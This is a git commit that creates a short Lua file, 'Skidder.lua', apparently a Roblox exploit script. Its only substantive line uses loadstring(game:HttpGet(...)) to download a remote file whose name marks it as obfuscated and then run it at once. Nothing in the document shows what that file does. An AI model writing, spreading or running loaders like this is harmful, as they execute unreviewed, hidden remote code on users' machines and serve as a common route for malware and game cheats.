a4fe0a5592a680c294eea90fd8608bb659e91c37
Ehehhdrhdhehehhehendducucuh <142185912+Ehehhdrhdhehehhehendducucuh@users.noreply.github.com>
2025-02-09 17:06:54 +0800

    Create Skidder.lua

---
+++ Skidder.lua
@@ -0,0 +1,3 @@
+getgenv().Image = "rbxassetid://12461099662"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Ehehhdrhdhehehhehendducucuh/Skid/refs/heads/main/obf_5mS4luGuD66Ib4E7dMf03TTE70YUARSPJ6fUX1yz3d87DWA8A43dp6xauSJfoAxe.lua.txt"))()
